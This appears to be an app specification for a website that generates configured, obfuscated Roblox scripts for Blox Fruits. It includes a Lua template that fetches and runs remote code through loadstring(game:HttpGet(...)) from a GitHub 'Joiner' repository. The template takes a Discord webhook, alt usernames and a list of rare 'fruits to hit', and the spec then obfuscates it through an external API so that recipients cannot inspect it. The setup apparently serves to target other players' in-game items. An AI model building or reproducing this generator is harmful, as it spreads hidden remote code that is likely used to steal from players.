# **App Name**: Roblox Script Forge

## Core Features:

- Configuration Input: Input fields for Discord Webhook URL, usernames (one per line), and a checklist for selecting fruits to hit.
- Script Generation: Generates a Roblox script based on the user-provided configuration, combining the script template with user inputs.
- Script Obfuscation: Obfuscates the generated script using the luaobfuscator.com API to make it harder to reverse engineer. Relies on external tool.
- Script Download: Provides a download button for the generated and obfuscated script.

## Style Guidelines:

- Primary color: Dark blue (#1E293B) for a modern, techy feel.
- Secondary color: Light gray (#E2E8F0) for contrast and readability.
- Accent: Teal (#2DD4BF) for highlights, active elements, and the download button.
- Clear sections for each input field, with labels and descriptions for each. Use a grid layout for fruit selection.
- Use simple, geometric icons for checkboxes and the download button.

## Original User Request:
A website that helps users generate their own configured and obfuscated scripts for roblox.
The first part of just entering and generating filled out script is made by me in a rough way.
Next, I want it to obfuscate the generated configuration, with https://luaobfuscator.com/ with an api key.
If needed further, i will provide the API key

Script template-

Webhook = "" -- << Discord Webhook Here
Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your usernames here, you can add as many alts as you want
FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want the script to detect
loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()


Here is the list of total fruits possible that should be able to be selected-
    // --- Data: Fruits ---
    const mythicalFruits = [ "Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas", "Leopard-Leopard", "Control-Control", "Dough-Dough", "T-Rex-T-Rex", "Spirit-Spirit", "Mammoth-Mammoth", "Venom-Venom" ];
    const legendaryFruits = [ "Portal-Portal", "Buddha-Buddha", "Rumble-Rumble", "Shadow-Shadow", "Blizzard-Blizzard", "Sound-Sound", "Phoenix-Phoenix", "Pain-Pain", "Gravity-Gravity", "Love-Love", "Spider-Spider", "Quake-Quake" ];
    const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];
    const defaultSelectedFruits = ["Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"];

I have attached a rough idea for the website as an image
  